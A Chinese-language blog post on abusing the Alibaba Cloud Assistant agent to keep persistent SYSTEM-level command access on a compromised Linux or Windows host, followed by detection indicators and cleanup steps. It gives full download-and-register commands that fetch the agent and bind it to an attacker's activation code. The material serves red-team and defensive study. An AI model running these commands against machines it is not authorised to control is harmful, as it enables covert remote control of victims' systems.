# 022-Ali云助手权限维持




## Ali云助手权限维持



## 利用

![image-20230817023716768](/resource/Ali云助手权限维持.assets/image-20230817023716768.png)

当生成注册码后，注册码内容只显示一次，因此需要保存此注册码唯一ID与内容。

同一个激活码最多可支持1000台，需要配置，默认为10，通过修改上图中的激活额度选项即可。

每个注册码都有有效期，默认为4小时，可以修改 有效期 参数进行调整。

支持Linux 和Windows :

Linux(.rpm)

```shell
sudo wget https://aliyun-client-assist.oss-accelerate.aliyuncs.com/linux/aliyun_assist_latest.rpm
sudo rpm -ivh aliyun_assist_latest.rpm --force 
sudo aliyun-service --register --RegionId "cn-hangzhou" \
   --ActivationCode "a-hz012xxxxxL47fD/f" \
   --ActivationId "1DA9xxxxxxD244E7"
```

Linux(.deb)

```shell
sudo wget https://aliyun-client-assist.oss-accelerate.aliyuncs.com/linux/aliyun_assist_latest.deb
sudo dpkg -i aliyun_assist_latest.deb
sudo aliyun-service --register --RegionId "cn-hangzhou" \
   --ActivationCode "a-hz012xxxxxx47fD/f" \
   --ActivationId "1DA9xxxxxx3D244E7"
```

Windows

```powershell
Invoke-WebRequest -Uri `
'https://aliyun-client-assist.oss-accelerate.aliyuncs.com/windows/aliyun_agent_latest_setup.exe' `
-OutFile 'C:\\aliyun_agent_latest_setup.exe'
&"C:\\aliyun_agent_latest_setup.exe" '/S' '--register' `
'--RegionId="cn-hangzhou"' '--ActivationCode="a-hz012xxxxvttL47fD/f"' `
'--ActivationId="1DA9xxxxx244E7"'
```

可能会出现权限不足的情况，需要将文件输出在当前用户可写的路径下。

在目标机器上运行相应脚本，执行完之后需要刷新或者重新打开一个标签页，即可展示结果：

![image-20230817024035403](/resource/Ali云助手权限维持.assets/image-20230817024035403.png)

执行命令相当于创建一个脚本，依次去执行；

远程登录即类似ECS，开启一个Web形式的终端

![image-20230817024508568](/resource/Ali云助手权限维持.assets/image-20230817024508568.png)

可以看到登录后即为system权限。



目前发现：

1. 命令执行时有 UAC认证，需要进行绕过
2. Powershell执行命令下载文件时，需要等待
3. 在Windows Arm上会被识别为Ubuntu
4. 只适合命令控制，传输文件大小有限制，上传的文件原始大小不大于24KB，且经过Base64编码后的文件不能大于32KB。因此更适合与命令控制和权限维持。



## 排查

运行云助手后，Windows系统上会有一个 aliyun_agent的进程

![image-20230817024805213](/resource/Ali云助手权限维持.assets/image-20230817024805213.png)

本地结束该进程后，远程连接即可终端。未发现进程保护等动作。

![image-20230817030214110](/resource/Ali云助手权限维持.assets/image-20230817030214110.png)

![image-20230817030414029](/resource/Ali云助手权限维持.assets/image-20230817030414029.png)



本地试了2台看到的通信IP都为：218.244.138.221的TLS加密流量，因为我开的两台都是华东1（杭州）节点，不太确定这个IP是否固定，大概率不确定。

![image-20230817025508652](/resource/Ali云助手权限维持.assets/image-20230817025508652.png)



**特征**：

1. 检测阿里云助手官方程序，确认是否本人安装
2. 域名：aliyun-client-assist.oss-accelerate.aliyuncs.com，可被绕过作私有部署
3. 通信流量，TLS Client Hello 证书握手时会有类似`cn-hanzhou.axt.aliyuncs.com`，一般是`*.axt.aliyuncs.com`
4. 进程名：aliyun_agent，服务名：Aliyun Assist Service

天眼分析中心日志检测，SSL加密协商：`server_name: (*.axt.aliyuncs.com)`

## 处置

1. 杀进程，关闭服务
2. 删除被非法安装的Ali云助手
3. 排查其他权限维持动作并清除。



## 参考文章：

https://mp.weixin.qq.com/s/-JqzD_F_5CqdwZAyhEBU8g

---

> 作者: Xavier  
> URL: https://www.bthoughts.top/posts/ali%E4%BA%91%E5%8A%A9%E6%89%8B%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/  

